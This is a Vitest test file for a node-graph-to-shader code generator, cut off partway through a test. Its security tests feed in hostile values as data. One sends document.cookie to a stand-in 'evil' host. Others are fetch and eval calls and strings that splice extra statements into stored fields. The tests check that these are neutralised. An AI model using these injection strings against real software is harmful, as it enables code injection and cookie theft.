import { describe, it, expect } from 'vitest';
import { graphToCode } from './graphToCode';
import { evaluateNodeOutput } from './cpuEvaluator';
import { makeNode, makeEdge } from '@/test-utils';

describe('graphToCode — empty graph', () => {
  it('returns the placeholder comment with no imports', () => {
    const result = graphToCode([], []);
    expect(result.code).toContain('Empty shader');
    expect(result.importStatements).toEqual([]);
    expect(result.varNames.size).toBe(0);
  });
});

describe('graphToCode — fallback return', () => {
  it('emits a red vec3 default when the output node has no wired channel', () => {
    const out = makeNode('out', 'output');
    const result = graphToCode([out], []);
    expect(result.code).toContain('return vec3(1, 0, 0)');
    expect(result.code).toContain("import { Fn, vec3 } from 'three/tsl';");
  });
});

describe('graphToCode — simple chain', () => {
  it('emits a color constant and wires it to output.color as a single return', () => {
    const color = makeNode('c', 'color', { hex: '#ff8800' });
    const out = makeNode('out', 'output');
    const edges = [makeEdge('c', 'out', 'out', 'color')];
    const { code, importStatements } = graphToCode([color, out], edges);

    // Body declares a `color1` variable using the hex literal as 0x...
    expect(code).toMatch(/const color1 = color\(0xff8800\);/);
    // Single-channel return for color-only output
    expect(code).toContain('return color1;');
    // No object-form return when only `color` is wired
    expect(code).not.toContain('{ color:');
    // Imports: Fn always, plus color
    expect(importStatements.join('\n')).toContain("from 'three/tsl';");
    expect(code).toContain('color');
  });

  it('emits an object return when multiple channels are wired', () => {
    const color = makeNode('c', 'color', { hex: '#00ff00' });
    const opacity = makeNode('f', 'float', { value: 0.5 });
    const out = makeNode('out', 'output');
    const edges = [
      makeEdge('c', 'out', 'out', 'color'),
      makeEdge('f', 'out', 'out', 'opacity'),
    ];
    const { code } = graphToCode([color, opacity, out], edges);
    expect(code).toMatch(/return \{ color: color1, opacity: float1 \};/);
  });
});

describe('graphToCode — variable naming', () => {
  it('numbers each instance from 1 so names never collide with imports', () => {
    const a = makeNode('a1', 'add');
    const b = makeNode('a2', 'add');
    const c = makeNode('a3', 'add');
    const out = makeNode('out', 'output');
    const edges = [makeEdge('a3', 'out', 'out', 'color')];
    const { code, varNames } = graphToCode([a, b, c, out], edges);
    // Three distinct names, all numbered from 1
    expect(varNames.get('a1')).toBe('add1');
    expect(varNames.get('a2')).toBe('add2');
    expect(varNames.get('a3')).toBe('add3');
    expect(code).toContain('const add1 = add(');
    expect(code).toContain('const add2 = add(');
    expect(code).toContain('const add3 = add(');
  });

  it('strips the mx_/_float MaterialX prefix/suffix from noise names', () => {
    const p = makeNode('p', 'perlin');
    const out = makeNode('out', 'output');
    const edges = [makeEdge('p', 'out', 'out', 'color')];
    const { varNames } = graphToCode([p, out], edges);
    // mx_noise_float → noise1, not mx_noise_float1
    expect(varNames.get('p')).toBe('noise1');
  });

  // Property names are load-bearing: uniform values persist by name, so the
  // bare-base-first / suffix-starts-at-2 scheme must never drift.
  it('gives a property node its bare user name with no suffix', () => {
    const p = makeNode('p', 'property_float', { name: 'speed', value: 1 });
    const out = makeNode('out', 'output');
    const { code, varNames } = graphToCode([p, out], [makeEdge('p', 'out', 'out', 'opacity')]);
    expect(varNames.get('p')).toBe('speed');
    expect(code).toContain('const speed = ');
  });

  it('suffixes a second same-named property starting at 2', () => {
    const p1 = makeNode('p1', 'property_float', { name: 'speed', value: 1 });
    const p2 = makeNode('p2', 'property_float', { name: 'speed', value: 2 });
    const out = makeNode('out', 'output');
    const { varNames } = graphToCode([p1, p2, out], [makeEdge('p1', 'out', 'out', 'opacity')]);
    expect(varNames.get('p1')).toBe('speed');
    expect(varNames.get('p2')).toBe('speed2');
  });

  it('skips past a taken suffix when resolving a property collision', () => {
    const p1 = makeNode('p1', 'property_float', { name: 'speed', value: 1 });
    const p2 = makeNode('p2', 'property_float', { name: 'speed2', value: 2 });
    const p3 = makeNode('p3', 'property_float', { name: 'speed', value: 3 });
    const out = makeNode('out', 'output');
    const { varNames } = graphToCode([p1, p2, p3, out], [makeEdge('p1', 'out', 'out', 'opacity')]);
    expect(varNames.get('p1')).toBe('speed');
    expect(varNames.get('p2')).toBe('speed2');
    expect(varNames.get('p3')).toBe('speed3');
  });

  it('skips the data base name forward when a column alias is already taken', () => {
    // The property claims `data1_col0` first (source-order among topological
    // peers), so the data node's `data1` candidate fails on its col0 alias and
    // the whole namespace shifts to `data2`/`data2_col0`.
    const p = makeNode('p', 'property_float', { name: 'data1_col0', value: 0.5 });
    const d = makeNode('d', 'dataNode', {});
    const out = makeNode('out', 'output');
    const { code, varNames } = graphToCode(
      [p, d, out],
      [makeEdge('p', 'out', 'out', 'opacity'), makeEdge('d', 'col0', 'out', 'color')],
    );
    expect(varNames.get('p')).toBe('data1_col0');
    expect(varNames.get('d')).toBe('data2');
    expect(code).toContain('const data2_col0');
  });

  it('an alias-rejected index stays claimable by a later data node', () => {
    // `p` takes `data1_col0`, so data node `a` (which uses col0) fails its
    // alias check on `data1` and shifts to `data2`. Node `b` only uses col1,
    // whose `data1_col1` alias is free — so `b` MUST still get `data1`.
    // A name cursor that advanced past every rejected index would give it
    // `data3` and rename the emitted variable.
    const p = makeNode('p', 'property_float', { name: 'data1_col0', value: 0.5 });
    const a = makeNode('a', 'dataNode', {});
    const b = makeNode('b', 'dataNode', {});
    const m = makeNode('m', 'mul', {});
    const out = makeNode('out', 'output');
    const { varNames, code } = graphToCode([p, a, b, m, out], [
      makeEdge('p', 'out', 'out', 'opacity'),
      makeEdge('a', 'col0', 'm', 'a'),
      makeEdge('b', 'col1', 'm', 'b'),
      makeEdge('m', 'out', 'out', 'color'),
    ]);
    expect(varNames.get('p')).toBe('data1_col0');
    expect(varNames.get('a')).toBe('data2');
    expect(varNames.get('b')).toBe('data1');
    expect(code).toContain('const data2_col0');
    expect(code).toContain('const data1_col1');
  });

  it('keeps walking the suffix chain for a fourth same-named property', () => {
    const p1 = makeNode('p1', 'property_float', { name: 'speed', value: 1 });
    const p2 = makeNode('p2', 'property_float', { name: 'speed2', value: 2 });
    const p3 = makeNode('p3', 'property_float', { name: 'speed', value: 3 });
    const p4 = makeNode('p4', 'property_float', { name: 'speed', value: 4 });
    const out = makeNode('out', 'output');
    const { varNames } = graphToCode([p1, p2, p3, p4, out],
      [makeEdge('p1', 'out', 'out', 'opacity')]);
    expect(varNames.get('p3')).toBe('speed3');
    expect(varNames.get('p4')).toBe('speed4');
  });

  it('a bareFirst collision never consumes the plain <base>1 slot', () => {
    // Two properties named `mul` walk the bare chain (mul, mul2); the mul NODE
    // must still get `mul1`. A single name cursor floored at 2 by the property
    // probe would hand it `mul3` — a byte-breaking rename of an emitted var.
    const p1 = makeNode('p1', 'property_float', { name: 'mul', value: 1 });
    const p2 = makeNode('p2', 'property_float', { name: 'mul', value: 2 });
    const m = makeNode('m', 'mul', {});
    const out = makeNode('out', 'output');
    const { varNames } = graphToCode([p1, p2, m, out], [
      makeEdge('p1', 'out', 'out', 'opacity'),
      makeEdge('m', 'out', 'out', 'color'),
    ]);
    expect(varNames.get('p1')).toBe('mul');
    expect(varNames.get('p2')).toBe('mul2');
    expect(varNames.get('m')).toBe('mul1');
  });
});

describe('graphToCode — edge lookup first-match', () => {
  it('uses the FIRST edge when two land on the same target handle', () => {
    // Single-input-per-port is enforced by the editor, but a hand-edited
    // .fastshader can carry both. The array order decides, and an index must
    // not change which one wins.
    const f1 = makeNode('f1', 'float', { value: 1 });
    const f2 = makeNode('f2', 'float', { value: 2 });
    const m = makeNode('m', 'mul', {});
    const out = makeNode('out', 'output');
    const e1 = { ...makeEdge('f1', 'out', 'm', 'a'), id: 'e1' };
    const e2 = { ...makeEdge('f2', 'out', 'm', 'a'), id: 'e2' };
    const { code } = graphToCode([f1, f2, m, out],
      [e1, e2, makeEdge('m', 'out', 'out', 'color')]);
    expect(code).toContain('mul(float1');
    expect(code).not.toContain('mul(float2');
  });

  it('ignores a node the topological sort dropped for a cycle', () => {
    const x = makeNode('x', 'mul', {});
    const y = makeNode('y', 'mul', {});
    const out = makeNode('out', 'output');
    // nodeById must index `sorted`, not `nodes` — x and y are cycle-excluded.
    const { code } = graphToCode([x, y, out], [
      makeEdge('x', 'out', 'y', 'a'),
      makeEdge('y', 'out', 'x', 'a'),
      makeEdge('y', 'out', 'out', 'color'),
    ]);
    expect(code).toContain('return vec3(1, 0, 0);');
  });
});

describe('graphToCode — type-constructor formatting', () => {
  it('formats a `#rrggbb` hex color value as `0xrrggbb`', () => {
    const c = makeNode('c', 'color', { hex: '#abcdef' });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([c, out], [makeEdge('c', 'out', 'out', 'color')]);
    expect(code).toContain('color(0xabcdef)');
  });

  it('emits a float literal verbatim for the `float` constructor', () => {
    const f = makeNode('f', 'float', { value: 2.5 });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([f, out], [makeEdge('f', 'out', 'out', 'opacity')]);
    expect(code).toContain('const float1 = float(2.5);');
  });
});

describe('graphToCode — UV node', () => {
  it('emits a bare uv() with no tiling or rotation', () => {
    const uv = makeNode('uv', 'uv', {
      channel: 0,
      tilingU: 1,
      tilingV: 1,
      rotation: 0,
    });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([uv, out], [makeEdge('uv', 'out', 'out', 'color')]);
    expect(code).toContain('const uv1 = uv();');
    expect(code).not.toContain('mul(');
    expect(code).not.toContain('cos(');
  });

  it('wraps in mul(uv(), vec2(...)) when tiling is non-default', () => {
    const uv = makeNode('uv', 'uv', {
      channel: 0,
      tilingU: 4,
      tilingV: 2,
      rotation: 0,
    });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([uv, out], [makeEdge('uv', 'out', 'out', 'color')]);
    expect(code).toContain('mul(uv(), vec2(4, 2))');
  });
});

describe('graphToCode — input passthrough', () => {
  it('emits zero-arg input functions as bare references', () => {
    // time → output.color: just a `time` reference, no `time()` call wrapper.
    const t = makeNode('t', 'time');
    const out = makeNode('out', 'output');
    const { code, importStatements } = graphToCode(
      [t, out],
      [makeEdge('t', 'out', 'out', 'opacity')],
    );
    expect(code).toContain('const time1 = time;');
    expect(importStatements.join('\n')).toContain('time');
  });
});

describe('graphToCode — scalar widening on vec3 output channels', () => {
  // three's NodeMaterial does `vec4(this.colorNode)`, and TSL splats a
  // 1-channel node across ALL FOUR components — so a bare scalar wired to
  // Color also became the ALPHA, making the surface flicker or vanish as if
  // Opacity/Discard were connected when neither is.
  const out = () => makeNode('out', 'output');

  it('widens a scalar noise driving Color, so alpha is left alone', () => {
    const { code } = graphToCode(
      [makeNode('n', 'perlin'), out()],
      [makeEdge('n', 'out', 'out', 'color')],
    );
    expect(code).toContain('return vec3(noise1);');
  });

  it('leaves a vec3 source byte-identical (no churn for existing shaders)', () => {
    const { code } = graphToCode(
      [makeNode('c', 'color', { hex: '#ff8800' }), out()],
      [makeEdge('c', 'out', 'out', 'color')],
    );
    expect(code).toContain('return color1;');
    expect(code).not.toContain('vec3(color1)');
  });

  it('widens only the vec3 channel — a scalar Opacity stays scalar', () => {
    const { code } = graphToCode(
      [makeNode('n', 'perlin'), makeNode('f', 'float', { value: 0.5 }), out()],
      [makeEdge('n', 'out', 'out', 'color'), makeEdge('f', 'out', 'out', 'opacity')],
    );
    expect(code).toMatch(/color: vec3\(noise1\)/);
    // Opacity IS a float channel — widening it would be a type error.
    expect(code).toMatch(/opacity: float1/);
  });

  it('narrows a vec4 source too — its .w must not become the alpha', () => {
    // `vec4(this.colorNode)` is an IDENTITY cast for a vec4, so the node's w
    // went straight to diffuseColor.a — and a fresh Vec4 node's w is 0, i.e.
    // fully transparent. Alpha may only come from the opacity channel.
    const { code } = graphToCode(
      [makeNode('v', 'vec4', { x: 1, y: 0, z: 0, w: 0 }), out()],
      [makeEdge('v', 'out', 'out', 'color')],
    );
    expect(code).toContain('return vec3(vec41);');
  });

  it('reads the shape of the PORT the edge leaves, not the node', () => {
    // Data Viz has out:vec3 + value:float. Node-level inference reports 3 for
    // both, so an edge from `value` skipped the widen and put a bare float in
    // colorNode — the same alpha splat by a second route.
    const { code } = graphToCode(
      [makeNode('d', 'dataviz'), out()],
      [makeEdge('d', 'value', 'out', 'color')],
    );
    expect(code).toMatch(/return vec3\(_dataviz1_t\);/);
  });

  it('leaves Displacement alone — a scalar height must stay scalar', () => {
    // position never reaches alpha, and normal-mode displacement scales the
    // NORMAL by this scalar; widening it would break the Data Viz height flow.
    const { code } = graphToCode(
      [makeNode('d', 'dataviz'), out()],
      [makeEdge('d', 'value', 'out', 'position')],
    );
    expect(code).toMatch(/position:\s*_dataviz1_t/);
  });

  it('emits the no-channel fallback without a trailing comment', () => {
    // A `//` on a return line defeats parseBody's end-anchored regexes, so the
    // line becomes a body statement that short-circuits the module's real
    // return — silently dropping Discard and every material setting.
    const { code } = graphToCode([makeNode('c', 'color', { hex: '#ff0000' })], []);
    expect(code).toContain('return vec3(1, 0, 0);');
    expect(code).not.toMatch(/return[^\n]*\/\//);
  });

  it('widens a scalar arithmetic chain, not just a declared float port', () => {
    // `mul` declares dataType 'any', so this only works via real shape
    // inference (getNodeOutputShape), not the registry port type.
    const { code } = graphToCode(
      [makeNode('n', 'perlin'), makeNode('m', 'mul', { b: 2 }), out()],
      [makeEdge('n', 'out', 'm', 'a'), makeEdge('m', 'out', 'out', 'color')],
    );
    expect(code).toContain('return vec3(mul1);');
  });
});

describe('graphToCode — time speed multiplier', () => {
  const out = () => makeNode('out', 'output');
  const wire = () => [makeEdge('t', 'out', 'out', 'opacity')];

  it('emits the bare reference for an explicit speed of 1 (byte-identical to legacy)', () => {
    const { code } = graphToCode([makeNode('t', 'time', { speed: 1 }), out()], wire());
    expect(code).toContain('const time1 = time;');
    // `time` is a uniform NODE OBJECT, not a callable — `time(1)` is a TypeError.
    expect(code).not.toMatch(/\btime\s*\(/);
  });

  it('emits a method chain for speed !== 1 and adds no mul import', () => {
    const { code, importStatements } = graphToCode(
      [makeNode('t', 'time', { speed: 2.5 }), out()],
      wire(),
    );
    expect(code).toContain('const time1 = time.mul(2.5);');
    expect(code).not.toMatch(/\btime\s*\(/);
    // Method chaining needs no `mul` import (same convention as the noise scale).
    expect(importStatements.join('\n')).not.toMatch(/\bmul\b/);
  });

  it('supports negative and zero speeds', () => {
    expect(graphToCode([makeNode('t', 'time', { speed: -1 }), out()], wire()).code)
      .toContain('const time1 = time.mul(-1);');
    expect(graphToCode([makeNode('t', 'time', { speed: 0 }), out()], wire()).code)
      .toContain('const time1 = time.mul(0);');
  });

  it('a wired speed socket overrides the stored value', () => {
    // `speed` is an opt-in input socket (same rule as the noise params): an
    // edge wins over the number, and the emitted shape stays the method chain
    // so codeToGraph collapses it back into one Time node.
    const { code } = graphToCode(
      [makeNode('s', 'property_float', { value: 4, name: 'tempo' }), makeNode('t', 'time', { speed: 2.5 }), out()],
      [makeEdge('s', 'out', 't', 'speed'), ...wire()],
    );
    expect(code).toContain('const time1 = time.mul(tempo);');
    expect(code).not.toContain('time.mul(2.5)');
  });

  it('falls back to the bare reference for adversarial speed values', () => {
    // .fastshader files are untrusted: a hostile string must never be spliced
    // into the emitted module, and a non-finite value must not reach num().
    for (const bad of ['0)); fetch("https://evil"); //', 'abc', Infinity, NaN]) {
      const { code } = graphToCode([makeNode('t', 'time', { speed: bad }), out()], wire());
      expect(code).toContain('const time1 = time;');
      expect(code).not.toContain('fetch');
      expect(code).not.toContain('Infinity');
      expect(code).not.toContain('NaN');
    }
  });
});

describe('graphToCode — binary-op defaults', () => {
  it('emits min with its identity (1) for an unwired operand, not 0', () => {
    // Regression: a legacy min node (no stored `b`) must fall back to the registry
    // default via resolveArguments so it emits min(a, 1), not the value-eating min(a, 0).
    const a = makeNode('a', 'float', { value: 0.7 });
    const mn = makeNode('mn', 'min'); // b unwired + unset
    const out = makeNode('out', 'output');
    const { code } = graphToCode([a, mn, out], [
      makeEdge('a', 'out', 'mn', 'a'),
      makeEdge('mn', 'out', 'out', 'color'),
    ]);
    expect(code).toContain('min(float1, 1)');
    expect(code).not.toContain('min(float1, 0)');
  });

  it('honours an explicit b = 0 on min', () => {
    const a = makeNode('a', 'float', { value: 0.7 });
    const mn = makeNode('mn', 'min', { b: 0 });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([a, mn, out], [
      makeEdge('a', 'out', 'mn', 'a'),
      makeEdge('mn', 'out', 'out', 'color'),
    ]);
    expect(code).toContain('min(float1, 0)');
  });

  it('emits clamp with the 0–1 identity bounds, not the signal-eating clamp(x, 0, 0)', () => {
    // Regression: clamp carried NO defaultValues, so BOTH unwired bounds fell
    // through resolveArguments' bare '0' placeholder and a freshly dropped
    // Clamp emitted `clamp(x, 0, 0)` — output constant 0, the whole signal
    // gone — while the CPU evaluator previewed max = 1, so the node's own
    // label disagreed with the render.
    const a = makeNode('a', 'float', { value: 0.7 });
    const cl = makeNode('cl', 'clamp'); // min + max unwired and unset
    const out = makeNode('out', 'output');
    const { code } = graphToCode([a, cl, out], [
      makeEdge('a', 'out', 'cl', 'x'),
      makeEdge('cl', 'out', 'out', 'color'),
    ]);
    expect(code).toContain('clamp(float1, 0, 1)');
    expect(code).not.toContain('clamp(float1, 0, 0)');
  });

  it('matches the CPU evaluator for an unwired clamp (node label vs render)', () => {
    // The two sides must agree: cpuEvaluator's `case 'clamp'` uses the same
    // 0 / 1 fallbacks this registry entry now declares.
    const a = makeNode('a', 'float', { value: 0.7 });
    const cl = makeNode('cl', 'clamp');
    const edges = [makeEdge('a', 'out', 'cl', 'x')];
    expect(evaluateNodeOutput('cl', [a, cl], edges, 0)).toEqual([0.7]);
  });

  it('emits remap as the IDENTITY when nothing is set, not a divide-by-zero', () => {
    // Regression: remap carried no defaultValues, so all four bounds fell to
    // codegen's bare '0' and emitted `remap(x, 0, 0, 0, 0)` — (x-0)/(0-0) is a
    // division by zero, i.e. NaN out of a freshly dropped node, while
    // cpuEvaluator previewed the 0…1 → 0…1 identity.
    const a = makeNode('a', 'float', { value: 0.7 });
    const rm = makeNode('rm', 'remap');
    const out = makeNode('out', 'output');
    const { code } = graphToCode([a, rm, out], [
      makeEdge('a', 'out', 'rm', 'x'),
      makeEdge('rm', 'out', 'out', 'color'),
    ]);
    expect(code).toContain('remap(float1, 0, 1, 0, 1)');
    expect(code).not.toContain('remap(float1, 0, 0, 0, 0)');
  });

  it('matches the CPU evaluator for an unwired remap', () => {
    const a = makeNode('a', 'float', { value: 0.7 });
    const rm = makeNode('rm', 'remap');
    const edges = [makeEdge('a', 'out', 'rm', 'x')];
    // Identity: 0.7 mapped from 0…1 onto 0…1 is 0.7.
    expect(evaluateNodeOutput('rm', [a, rm], edges, 0)).toEqual([0.7]);
  });

  it('still honours explicit remap bounds', () => {
    const a = makeNode('a', 'float', { value: 0.5 });
    const rm = makeNode('rm', 'remap', { inLow: 0, inHigh: 1, outLow: 10, outHigh: 20 });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([a, rm, out], [
      makeEdge('a', 'out', 'rm', 'x'),
      makeEdge('rm', 'out', 'out', 'color'),
    ]);
    expect(code).toContain('remap(float1, 0, 1, 10, 20)');
  });

  it('still honours explicit clamp bounds', () => {
    const a = makeNode('a', 'float', { value: 5 });
    const cl = makeNode('cl', 'clamp', { min: 1, max: 3 });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([a, cl, out], [
      makeEdge('a', 'out', 'cl', 'x'),
      makeEdge('cl', 'out', 'out', 'color'),
    ]);
    expect(code).toContain('clamp(float1, 1, 3)');
  });
});

describe('graphToCode — exposed-param resolution consults the registry', () => {
  it('a uv node with EMPTY values emits a bare uv(), not uv(1) with a 1-radian spin', () => {
    // resolveExposedParam never consulted def.defaultValues, so every missing
    // key fell to a hardcoded 1 — a legacy or hand-edited node emitted a full
    // 57-degree rotation nobody asked for, while cpuEvaluator assumed 0.
    const uv = makeNode('uv', 'uv');
    uv.data.values = {};
    const out = makeNode('out', 'output');
    const { code } = graphToCode([uv, out], [makeEdge('uv', 'out', 'out', 'color')]);
    expect(code).not.toContain('rotateUV');
    expect(code).not.toMatch(/uv\(1\)/);
  });

  it('still resolves the noise identifier and scale defaults', () => {
    // `pos` holds an IDENTIFIER, not a number — it must stay intercepted by its
    // own branch, and `scale` must still land on 1.
    const n = makeNode('n', 'perlin');
    n.data.values = {};
    const out = makeNode('out', 'output');
    const { code } = graphToCode([n, out], [makeEdge('n', 'out', 'out', 'color')]);
    expect(code).toContain('positionGeometry');
    expect(code).not.toContain('positionGeometry.mul(');
  });
});

describe('graphToCode — noise nodes', () => {
  it('emits the MaterialX function call with positionGeometry as default arg', () => {
    const p = makeNode('p', 'perlin', { pos: 'positionGeometry', scale: 1 });
    const out = makeNode('out', 'output');
    const { code, importStatements } = graphToCode(
      [p, out],
      [makeEdge('p', 'out', 'out', 'color')],
    );
    expect(code).toContain('const noise1 = mx_noise_float(positionGeometry);');
    const importsJoined = importStatements.join('\n');
    expect(importsJoined).toContain('mx_noise_float');
    expect(importsJoined).toContain('positionGeometry');
  });

  it('applies a scale factor via method chain when scale ≠ 1', () => {
    const p = makeNode('p', 'perlin', { pos: 'positionGeometry', scale: 4 });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([p, out], [makeEdge('p', 'out', 'out', 'color')]);
    expect(code).toContain('mx_noise_float(positionGeometry.mul(4))');
  });
});

describe('graphToCode — unknown nodes', () => {
  it('round-trips the preserved raw expression verbatim', () => {
    const u = makeNode('u', 'unknown', {
      functionName: 'mysteryFn',
      rawExpression: 'mysteryFn(1, 2, 3)',
    });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([u, out], [makeEdge('u', 'out', 'out', 'color')]);
    expect(code).toContain('const mysteryFn1 = mysteryFn(1, 2, 3);');
  });

  // Legitimate TSL shapes that codeToGraph can legitimately capture must still
  // survive the validator, including nested calls, swizzles, and arithmetic.
  it.each([
    'mysteryFn(vec3(1, 2, 3), 0.5)',
    'mysteryFn(positionLocal.mul(2.0))',
    'mysteryFn(uv().x, -1.0)',
    'mysteryFn(a, b, c)',
  ])('preserves a legitimate expression: %s', (rawExpression) => {
    const u = makeNode('u', 'unknown', { functionName: 'mysteryFn', rawExpression });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([u, out], [makeEdge('u', 'out', 'out', 'color')]);
    expect(code).toContain(`const mysteryFn1 = ${rawExpression};`);
  });

  // A tampered .fastshader/.js could swap rawExpression for code that executes
  // in the preview iframe. The validator must replace anything that isn't a
  // pure data/TSL expression with the inert `float(0)` fallback. (Defense in
  // depth — the preview iframe is also sandboxed to an opaque origin.)
  it.each([
    ['IIFE arrow argument', 'mysteryFn((() => { window.location = "http://evil/" + document.cookie })())'],
    ['fetch in argument', 'mysteryFn(fetch("http://evil"))'],
    ['bare eval call', 'eval("alert(1)")'],
    ['forbidden global in argument', 'mysteryFn(window.document.cookie)'],
    ['member-expression callee', 'window.fetch("http://evil")'],
    ['statement list', 'mysteryFn(); fetch("http://evil")'],
    ['assignment in argument', 'mysteryFn(window.name = "x")'],
    ['computed property access', 'mysteryFn(self["eval"]("x"))'],
  ])('neutralizes a malicious expression (%s) to float(0)', (_label, rawExpression) => {
    const u = makeNode('u', 'unknown', { functionName: 'mysteryFn', rawExpression });
    const out = makeNode('out', 'output');
    const { code } = graphToCode([u, out], [makeEdge('u', 'out', 'out', 'color')]);
    expect(code).toContain('const mysteryFn1 = float(0);');
    expect(code).not.toContain('fetch');
    expect(code).not.toContain('window');
    expect(code).not.toContain('eval');
    expect(code).not.toContain('document');
  });
});

describe('graphToCode — stored values never reach the module as code', () => {
  const out = () => makeNode('out', 'output');
  const PAYLOAD = '0); globalThis.__pwned = 1; float(0';

  /** Every emitted `const` line must be exactly one statement. */
  const oneStatementPerLine = (code: string) => {
    for (const line of code.split('\n')) {
      if (!line.startsWith('  const ')) continue;
      expect(line.split(';'), line).toHaveLength(2);
    }
  };

  // Site 1 — the generic type-constructor branch.
  it.each(['float', 'int', 'slider', 'property_float'])(
    'neutralizes a poisoned stored value on the %s constructor',
    (type) => {
      const n = makeNode('n', type, { value: PAYLOAD, name: 'p' });
      const { code } = graphToCode([n, out()], [makeEdge('n', 'out', 'out', 'color')]);
      expect(code).not.toContain('__pwned');
      oneStatementPerLine(code);
    },
  );

  it('routes a colour through hexLiteral even when it does not start with #', () => {
    // The old guard was `startsWith('#')`, so a `0x…` payload bypassed it.
    const c = makeNode('c', 'color', { hex: '0xff0000); globalThis.__pwned = 1; color(0' });
    const { code } = graphToCode([c, out()], [makeEdge('c', 'out', 'out', 'color')]);
    expect(code).toContain('const color1 = color(0x000000);');
    expect(code).not.toContain('__pwned');
  });

  // Site 2 — resolveArguments (unwired operand carrying a stored value).
  it('falls back to the registry default for a poisoned unwired operand', () => {
    const a = makeNode('a', 'float', { value: 0.5 });
    const m = makeNode('m', 'min', { b: '1); globalThis.__pwned = 1; float(1' });
    const { code } = graphToCode(
      [a, m, out()],
      [makeEdge('a', 'out', 'm', 'a'), makeEdge('m', 'out', 'out', 'color')],
    );
    expect(code).toContain('const min1 = min(float1, 1);'); // min's registry default b = 1
    expect(code).not.toContain('__pwned');
  });

  it('falls back to the chain identity when a poisoned operand has no registry default', () => {
    const a = makeNode('a', 'float', { value: 0.5 });
    const m = makeNode('m', 'mul', { b: '1); globalThis.__pwned = 1; float(1' });
    const { code } = graphToCode(
      [a, m, out()],
      [makeEdge('a', 'out', 'm', 'a'), makeEdge('m', 'out', 'out', 'color')],
    );
    expect(code).toContain('const mul1 = mul(float1, 1);'); // mul's chainIdentity = 1
    expect(code).not.toContain('__pwned');
  });

  it('neutralizes a poisoned vec3 component', () => {
    const v = makeNode('v', 'vec3', { x: '1, 1, 1); globalThis.__pwned = 1; vec3(0', y: 0, z: 0 });
    const { code } = graphToCode([v, out()], [makeEdge('v', 'out', 'out', 'color')]);
    expect(code).toContain('const vec31 = vec3(0, 0, 0);');
    expect(code).not.toContain('__pwned');
  });

  // Site 3 — resolveExposedParam (noise pos/scale, uv channel/tiling/rotation).
  it('neutralizes a poisoned noise scale', () => {
    const n = makeNode('n', 'perlin', { pos: 'positionGeometry', scale: '2); globalThis.__pwned = 1; float(1' });
    const { code } = graphToCode([n, out()], [makeEdge('n', 'out', 'out', 'color')]);
    expect(code).toContain('const noise1 = mx_noise_float(positionGeometry);');
    expect(code).not.toContain('__pwned');
  });

  it('neutralizes a poisoned noise pos but KEEPS a legitimate identifier', () => {
    const bad = makeNode('n', 'perlin', { pos: 'positionGeometry); globalThis.__pwned = 1; float(1', scale: 1 });
    const badCode = graphToCode([bad, out()], [makeEdge('n', 'out', 'out', 'color')]).code;
    expect(badCode).toContain('const noise1 = mx_noise_float(positionGeometry);');
    expect(badCode).not.toContain('__pwned');
    oneStatementPerLine(badCode);
    // codeToGraph stores the unresolved variable NAME of a pasted noise call —
    // an identifier must survive verbatim or those graphs change on every save.
    const ok = makeNode('n', 'perlin', { pos: 'myUnresolvedVar', scale: 1 });
    expect(graphToCode([ok, out()], [makeEdge('n', 'out', 'out', 'color')]).code)
      .toContain('const noise1 = mx_noise_float(myUnresolvedVar);');
  });

  it.each(['channel', 'tilingU', 'tilingV', 'rotation'])(
    'neutralizes a poisoned uv %s',
    (key) => {
      const u = makeNode('u', 'uv', {
        channel: 0, tilingU: 1, tilingV: 1, rotation: 0,
        [key]: '1); globalThis.__pwned = 1; uv(0',
      });
      const { code } = graphToCode([u, out()], [makeEdge('u', 'out', 'out', 'color')]);
      expect(code).not.toContain('__pwned');
      oneStatementPerLine(code);
    },
  );

  // Byte-stability: the values a real graph carries must be untouched.
  it('is byte-identical for legitimate numeric values', () => {
    const legit = [
      [makeNode('f', 'float', { value: 2.5 }), 'const float1 = float(2.5);'],
      [makeNode('f', 'float', { value: 0 }), 'const float1 = float(0);'],
      [makeNode('f', 'int', { value: 3 }), 'const int1 = int(3);'],
      [makeNode('f', 'slider', { value: 0.5, min: 0, max: 1 }), 'const float1 = float(0.5);'],
      [makeNode('f', 'color', { hex: '#abcdef' }), 'const color1 = color(0xabcdef);'],
    ] as const;
    for (const [node, expected] of legit) {
      expect(graphToCode([node, out()], [makeEdge('f', 'out', 'out', 'color')]).code, expected)
        .toContain(expected);
    }
    // A numeric STRING prints exactly as the number it denotes.
    expect(graphToCode(
      [makeNode('f', 'float', { value: '2.5' }), out()],
      [makeEdge('f', 'out', 'out', 'color')],
    ).code).toContain('const float1 = float(2.5);');
    // uv tiling keeps its exact literals.
    expect(graphToCode(
      [makeNode('u', 'uv', { channel: 0, tilingU: 4, tilingV: 2, rotation: 0 }), out()],
      [makeEdge('u', 'out', 'out', 'color')],
    ).code).toContain('mul(uv(), vec2(4, 2))');
  });
});

describe('graphToCode — split node swizzle inlining', () => {
  it('inlines source.x rather than emitting a standalone split variable', () => {
    const vec = makeNode('v', 'vec3', { x: 1, y: 2, z: 3 });
    const split = makeNode('s', 'split');
    const out = makeNode('out', 'output');
    const edges = [
      makeEdge('v', 'out', 's', 'v'),
      makeEdge('s', 'x', 'out', 'opacity'), // wire the .x swizzle to opacity (a float)
    ];
    const { code } = graphToCode([vec, split, out], edges);
    // `split` does NOT get its own variable — the swizzle is inlined as vec3_var.x
    expect(code).not.toMatch(/const split1 = /);
    // The swizzle is inlined as `<sourceVar>.x` rather than going through a split variable.
    expect(code).toMatch(/opacity: vec31\.x/);
  });
});

describe('graphToCode — append output sizing', () => {
  it('chooses vec3 when concatenating a vec2 and a float', () => {
    const v2 = makeNode('v2', 'vec2', { x: 1, y: 2 });
    const f = makeNode('f', 'float', { value: 3 });
    const ap = makeNode('ap', 'append');
    const out = makeNode('out', 'output');
    const edges = [
      makeEdge('v2', 'out', 'ap', 'a'),
      makeEdge('f', 'out', 'ap', 'b'),
      makeEdge('ap', 'out', 'out', 'color'),
    ];
    const { code } = graphToCode([v2, f, ap, out], edges);
    expect(code).toMatch(/const append1 = vec3\(/);
